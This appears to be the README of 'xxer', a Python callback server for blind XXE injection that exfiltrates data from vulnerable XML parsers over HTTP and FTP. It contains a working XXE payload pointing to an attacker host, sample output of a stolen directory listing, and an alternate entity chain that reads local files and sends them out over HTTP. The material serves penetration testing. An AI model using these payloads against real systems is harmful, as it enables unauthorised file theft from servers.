# xxer
A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by [ONsec-Lab](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb). Rewritten here because I don't like Ruby.

Basically, this doesn't actually find XXE injection for you, it helps you deal with getting useful information back once you've found a vulnerable input. For actually finding vulnerable injection points, I recommend using a small HTTP payload and some sort of DNS callback service like [Burp Collaborator](https://portswigger.net/burp/help/collaborator.html). If Collaborator reports a DNS lookup, followed by an HTTP request, then you're good to go.

## Target Audience
If you can explain what XXE injection is and how to find it, this is for you. If not, check out [vulnd_xxe](https://github.com/TheTwitchy/vulnd_xxe).

## Examples

### Options
```
root@kali:~$ xxer.py -h
usage: xxer [-h] [-v] [-q] [-p HTTP] [-P FTP] -H HOSTNAME

XXE Injection Handler

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -q, --quiet           surpress extra output
  -p HTTP, --http HTTP  HTTP server port
  -P FTP, --ftp FTP     FTP server port
  -H HOSTNAME, --hostname HOSTNAME
                        Hostname of this server
  -d DTD_FILE, --dtd DTD_FILE
                        The DTD file used for the XXE attack

Originally from https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-
server.rb, rewritten in Python by TheTwitchy
```

### Basic Usage
```
root@kali:~$ xxer.py -H kali.host.com
                 
 _ _ _ _ ___ ___ 
|_'_|_'_| -_|  _|
|_,_|_,_|___|_|  
                 
version 1.0

info: Starting xxer_httpd on port 8080
info: Starting xxer_ftpd on port 2121
info: Servers started. Use the following payload (with URL-encoding):

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://kali.host.com:8080/ext.dtd">%aaa;%ccc;%ddd;]>


127.0.0.1 - - [23/Apr/2017 20:59:04] "GET /ext.dtd HTTP/1.1" 200 -
info: FTP: recvd 'USER fakeuser'
info: FTP: recvd 'PASS aaaaaaaaaadescriptivefoldername
IRS_LETTERS_2014_ANGRY
passwords.txt
pictures_of_ex_hi_def
pictures_of_ex_ultra_hi_def
szechuan_sauce_recipe.pgp
TAXES2012
Taxes2013
TAXES2015
Temporary Internet Files
'
info: FTP: recvd 'TYPE I'
info: FTP: recvd 'EPSV ALL'
info: FTP: recvd 'EPSV'
info: FTP: recvd 'RETR b'
```

## "Features"
  * Only has one exfiltration point (currently, the FTP password). Obviously this can be changed up as needed, but may require some basic code changes (specifically in the FTP handlers).
  * Install via ``pip``. Needs at least a requirements.txt or a setup.py. For now just clone and run.
  * Currently serves up everything in the folder in which it was run over HTTP. Probably not a huge security risk, but something you should be aware of, especially on a public server.
  * Integrated server file/directory browsing as a future upgrade?

## Troubleshooting
  * I don't get a callback over HTTP to retrieve ``ext.dtd``.
    * This could mean a number of things, mostly related to not being vulnerable to XXE:
      * External entities may be disallowed. This can be done by rejecting DOCTYPE decclarations in documents, which I believe prevents XXE injection.
      * It may also allow entities, but disallow entities from remote sources. I've seen this on some Python XML libraries.
      * Outbound traffic could be blocked at a firewall, or requests may only go to whitelisted hosts.
    * There could also be a typo in the payload or a bug. Check the generated ``ext.dtd`` file to make sure everything looks correct. 
    * If you get some sort of parsing error, make sure you apply URL encoding (or remove it, I dunno) to the payload. Basically make sure you have the "correct" amount of encoding.
  * The initial HTTP callback for ext.dtd works, but after that I see nothing.
    * This could mean that FTP as a protocol is disabled server-side. Try changing the FTP callback in ``ext.dtd`` to an HTTP one, like ``<!ENTITY % bbb SYSTEM "file:///tmp/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'http://HOSTNAME:8080/b'>">``. If you get a callback to the /b document, this is probably the case. Try using the gopher protocol as well, but this was removed in Java 1.6.32 (or something close).
